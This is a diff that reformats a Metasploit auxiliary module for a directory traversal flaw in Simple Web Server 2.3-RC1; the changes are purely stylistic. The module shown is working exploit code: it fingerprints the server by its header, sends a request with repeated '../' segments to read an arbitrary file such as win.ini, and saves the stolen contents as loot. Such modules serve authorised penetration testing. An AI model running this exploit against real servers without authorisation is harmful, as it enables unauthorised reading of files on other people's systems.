@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,42 +7,40 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Simple Web Server 2.3-RC1 Directory Traversal',
-      'Description'    => %q{
-          This module exploits a directory traversal vulnerability found in
-        Simple Web Server 2.3-RC1.
-      },
-      'References'     =>
-        [
-          [ 'OSVDB', '88877' ],
-          [ 'EDB', '23886' ],
-          [ 'URL', 'http://seclists.org/bugtraq/2013/Jan/12' ]
-        ],
-      'Author'         =>
-        [
-          'CwG GeNiuS',
-          'sinn3r'
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Jan 03 2013"
-    ))
+                      'Name'           => 'Simple Web Server 2.3-RC1 Directory Traversal',
+                      'Description'    => %q(
+                          This module exploits a directory traversal vulnerability found in
+                        Simple Web Server 2.3-RC1.
+                      ),
+                      'References'     =>
+                        [
+                          [ 'OSVDB', '88877' ],
+                          [ 'EDB', '23886' ],
+                          [ 'URL', 'http://seclists.org/bugtraq/2013/Jan/12' ]
+                        ],
+                      'Author'         =>
+                        [
+                          'CwG GeNiuS',
+                          'sinn3r'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => "Jan 03 2013"))
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The name of the file to download', 'windows\\win.ini']),
         OptInt.new('DEPTH',       [true, 'The max traversal depth', 8])
-      ], self.class)
+      ], self.class
+    )
 
     deregister_options('RHOST')
   end
-
 
   #
   # The web server will actually return two HTTP statuses: A 400 (Bad Request), and the actual
@@ -62,9 +61,8 @@ class MetasploitModule < Msf::Auxiliary
       proto, code, message = status_line[1]
     end
 
-    return message, code.to_i, proto
+    [message, code.to_i, proto]
   end
-
 
   #
   # The MSF API cannot parse this weird response
@@ -74,27 +72,25 @@ class MetasploitModule < Msf::Auxiliary
     str.split(/\r\n\r\n/)[2] || ''
   end
 
-
   def is_sws?
-    res = send_request_raw({'uri'=>'/'})
-    if res and res.headers['Server'].to_s =~ /PMSoftware\-SWS/
+    res = send_request_raw('uri' => '/')
+    if res && res.headers['Server'].to_s =~ /PMSoftware\-SWS/
       return true
     else
       return false
     end
   end
 
-
   def run_host(ip)
-    if not is_sws?
+    unless is_sws?
       print_error("#{ip}:#{rport} - This isn't a Simple Web Server")
       return
     end
 
-    uri = normalize_uri("../"*datastore['DEPTH'], datastore['FILEPATH'])
-    res = send_request_raw({'uri'=>uri})
+    uri = normalize_uri("../" * datastore['DEPTH'], datastore['FILEPATH'])
+    res = send_request_raw('uri' => uri)
 
-    if not res
+    unless res
       print_error("#{ip}:#{rport} - Request timed out.")
       return
     end
@@ -116,8 +112,7 @@ class MetasploitModule < Msf::Auxiliary
       p = store_loot('simplewebserver.file', 'application/octet-stream', ip, body, fname)
       print_good("#{ip}:#{rport} - #{fname} stored in: #{p}")
     else
-      print_error("#{ip}:#{rport} - Unable to retrieve file: #{code.to_s} (#{message})")
+      print_error("#{ip}:#{rport} - Unable to retrieve file: #{code} (#{message})")
     end
   end
 end
-
